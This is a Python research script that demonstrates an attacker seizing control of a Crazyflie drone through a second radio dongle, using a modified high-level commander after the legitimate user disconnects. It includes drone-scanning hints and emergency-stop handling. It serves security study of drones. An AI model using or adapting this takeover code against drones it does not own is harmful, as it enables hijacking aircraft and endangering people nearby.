#!/usr/bin/env python3
"""
takeover_demo.py
Author: fatemehazam-crypto
Email: faa5778@utulsa.edu

Description:
This script uses the hacke_highlevel_commander to demonstrates a complete takeover attack on
a Crazyflie drone.It shows how an attacker can seize control from a legitimate user by connecting
via a different Crazyradio dongle. Features emergency stop functionality and high-level commander
control for precise trajectory-based maneuvers.

Features:
- Legitimate user control simulation with high-level commands
- Attacker takeover capability using trajectory control
- Emergency stop functionality with Ctrl+C safety
- Threaded execution for realistic timing
- Global drone management for emergency situations

Usage:
Run this script to demonstrate a drone takeover attack. The legitimate user
takes off first using high-level commands, then the attacker seizes control after a 
timed delay using trajectory-based commands.

DRONE DISCOVERY:
You don't need to know the exact drone address beforehand. Use the scanner.py 
utility to identify active drones and their communication parameters:

    python scanner.py --scan  # Scan for all available drones
    

Note: -Requires two Crazyradio dongles and a Crazyflie drone.
      - Needs a positiong system and related decks. Tested with Loco anchors and loco deck.
     
"""

import time
import threading
import logging
from cflib.crazyflie import Crazyflie
from cflib import crtp
import signal
import sys

# Configure logging
logging.basicConfig(level=logging.INFO)

# Global variable to control emergency stop
emergency_stop_triggered = False
active_drones = {}

def emergency_stop(sig=None, frame=None):
    """
    Emergency stop function that stops all drones immediately.
    
    This function is triggered by Ctrl+C (SIGINT) and ensures all
    drones are properly stopped. Critical for safety during demonstrations.
    
    Args:
        sig: Signal number (optional)
        frame: Current stack frame (optional)
    """
    global emergency_stop_triggered
    print("🛑 EMERGENCY STOP TRIGGERED! Stopping all drones...")
    emergency_stop_triggered = True
    
    # Immediately stop all active drones
    for uri, cf in active_drones.items():
        try:
            print(f"🔧 Stopping motors for {uri}")
            cf.commander.send_stop_setpoint()  # Stop motors immediately
            print(f"✅ Drone {uri} stopped")
        except Exception as e:
            print(f"❌ Error stopping {uri}: {e}")
    
    sys.exit(0)  # Exit the entire program safely

# Register Ctrl+C handler for emergency stop
signal.signal(signal.SIGINT, emergency_stop)


def legitimate_control():
    """
    Normal user controlling the drone - MUST DISCONNECT before attack.
    
    This function simulates a legitimate user operating a drone normally
    using high-level commander. It takes off, hovers, then lands and 
    disconnects to allow for a clean takeover.
    """
    normal_uri = "radio://0/80/2M/"
    
    cf_normal = Crazyflie(rw_cache='./cache')
    active_drones[normal_uri] = cf_normal
    
    try:
        # Establish connection to the drone
        cf_normal.open_link(normal_uri)
        time.sleep(2)
        
        print("🛩 Legitimate user: Taking off...")
        from cflib.crazyflie.high_level_commander import HackedHighLevelCommander

        # Use high-level commander for high level control
        commander = HackedHighLevelCommander(cf_normal)
        commander.takeoff(0.5, 3)  # Height: 0.5m, Duration: 3s
        time.sleep(2.5)
        print("✅ Legitimate user: Drone airborne")
        
        # Maintain control for limited time before handover
        time.sleep(8)
        
        # Clean disconnect to allow attacker takeover
        print(f"🛑 Legitimate user: Disconnecting from {normal_uri}")
        commander.land(0, 3)  # Land to height 0m over 3 seconds
        time.sleep(3.5)
        cf_normal.close_link()
        
        # Remove from active drones tracking
        if normal_uri in active_drones:
            del active_drones[normal_uri]
        
    except Exception as e:
        print(f"❌ Legitimate control error: {e}")
        # Ensure cleanup on error
        try:
            if cf_normal.is_connected():
                cf_normal.close_link()
            if normal_uri in active_drones:
                del active_drones[normal_uri]
        except:
            pass


def attack_control():
    """
    Attacker taking over control from legitimate user.
    
    This function demonstrates how an attacker can connect to the same
    drone using a different Crazyradio dongle and seize control. It uses 
    high-level trajectory commands for smooth, aggressive maneuvers.
    """
    time.sleep(10)  # Wait for legitimate user to completely disconnect first
    
    attack_uri = "radio://1/80/2M/"
    cf_attack = Crazyflie(rw_cache='./cache')
    active_drones[attack_uri] = cf_attack

    try:
        # Connect to same drone via second radio
        cf_attack.open_link(attack_uri)
        time.sleep(2)
        
        print("⚡ ATTACKER: Taking over control...")
        from cflib.crazyflie.high_level_commander import HackedHighLevelCommander
        commander = HackedHighLevelCommander(cf_attack)
        
        # Takeover with high-level commander
        commander.takeoff(1.0, 3)  # Aggressive takeoff to 1.0m
        time.sleep(3.5)
 
        print("✅ ATTACKER: Takeover successful!")
        
        # Demonstrate control with aggressive high-level maneuvers
        commander.go_to(0.5, 0.5, 1.0, 0, 5)  # Move to position (0.5, 0.5, 1.0)
        time.sleep(5.5)
        
        commander.go_to(0.5, 1.0, 1.0, 0, 5)  # Additional maneuver
        time.sleep(5.5)
        
        # Safe landing sequence
        commander.land(0, 5)  # Land over 5 seconds
        time.sleep(5.5)
        
        cf_attack.close_link()
        if attack_uri in active_drones:
            del active_drones[attack_uri]

    except Exception as e:
        print(f"❌ Attack control error: {e}")
    finally:
        # Ensure cleanup in case of errors
        try:
            if cf_attack.is_connected():
                cf_attack.close_link()
            if attack_uri in active_drones:
                del active_drones[attack_uri]
        except:
            pass


def run_demo():
    """
    Main demonstration function that orchestrates the takeover attack.
    
    This function initializes the radio drivers, starts the legitimate user thread,
    and then starts the attacker thread with proper timing for a realistic
    drone takeover scenario.
    
    Includes emergency stop handling and global drone management for safety.
    """
    print("DRONE TAKEOVER DEMO")
    print("======================")
    print("PHASE 1: Legitimate takeoff and hover")
    print("PHASE 2: Attacker connection and takeover")
    print("")
    print("⚠️  Press Ctrl+C at any time for emergency stop")
    print("")
    
    # Initialize Crazyflie radio drivers
    crtp.init_drivers()
    time.sleep(1)
    
    # Create threads for both roles
    legit_thread = threading.Thread(target=legitimate_control)
    attack_thread = threading.Thread(target=attack_control)
    
    # Start legitimate control first
    print("🔹 Starting legitimate control...")
    legit_thread.start()
    time.sleep(5)  # Wait for takeoff to complete
    
    # Then start attack control after delay
    print("🔹 Starting attack control (delayed)...")
    attack_thread.start()
    
    # Wait for both threads to complete
    legit_thread.join()
    attack_thread.join()
    
    print("✅ Takeover demo completed successfully!")


if __name__ == "__main__":
    """
    Main entry point when script is executed directly.
    
    Ensures the script only runs when executed as a main program
    and not when imported as a module. Includes emergency stop
    registration for safety.
    """
    run_demo()
